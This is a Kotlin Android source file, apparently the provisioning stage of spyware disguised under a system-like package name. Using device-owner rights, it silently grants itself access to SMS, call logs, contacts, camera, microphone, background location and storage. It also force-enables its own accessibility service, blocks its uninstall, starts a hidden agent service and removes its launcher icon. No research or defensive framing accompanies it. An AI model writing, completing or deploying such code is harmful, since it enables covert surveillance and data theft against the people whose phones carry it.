package com.sys.service

import android.Manifest
import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.app.admin.DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED
import android.app.admin.DevicePolicyManager.PERMISSION_POLICY_AUTO_GRANT
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings

class Provisioning : Activity() {

    override fun onCreate(b: Bundle?) {
        super.onCreate(b)
        val dpm = getSystemService(DevicePolicyManager::class.java)
        val admin = ComponentName(this, AdminReceiver::class.java)
        val pkg = packageName

        if (!dpm.isDeviceOwnerApp(pkg)) {
            startActivity(Intent(this, MainActivity::class.java))
            finish()
            return
        }

        runCatching { dpm.setPermissionPolicy(admin, PERMISSION_POLICY_AUTO_GRANT) }
        listOf(
            Manifest.permission.POST_NOTIFICATIONS, Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS, Manifest.permission.SEND_SMS,
            Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_PHONE_STATE, Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO, Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.ACCESS_BACKGROUND_LOCATION,
            Manifest.permission.MANAGE_EXTERNAL_STORAGE,
            Manifest.permission.READ_MEDIA_IMAGES, Manifest.permission.READ_MEDIA_VIDEO,
            Manifest.permission.READ_MEDIA_AUDIO,
            Manifest.permission.SYSTEM_ALERT_WINDOW
        ).forEach { p ->
            runCatching { dpm.setPermissionGrantState(admin, pkg, p, PERMISSION_GRANT_STATE_GRANTED) }
        }

        val me = pkg + "/" + AccSvc::class.java.name
        val cur = Settings.Secure.getString(
            contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES).orEmpty()
        if (!cur.contains(me)) runCatching {
            dpm.setSecureSetting(admin, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES,
                (cur + ":" + me).trimStart(':'))
        }
        runCatching { dpm.setSecureSetting(admin, Settings.Secure.ACCESSIBILITY_ENABLED, "1") }
        runCatching { dpm.setUninstallBlocked(admin, pkg, true) }

        startForegroundService(Intent(this, AgentSvc::class.java))
        Handler(Looper.getMainLooper()).postDelayed({
            packageManager.setComponentEnabledSetting(
                ComponentName(this, MainActivity::class.java),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
            finish()
        }, 1500)
    }
}
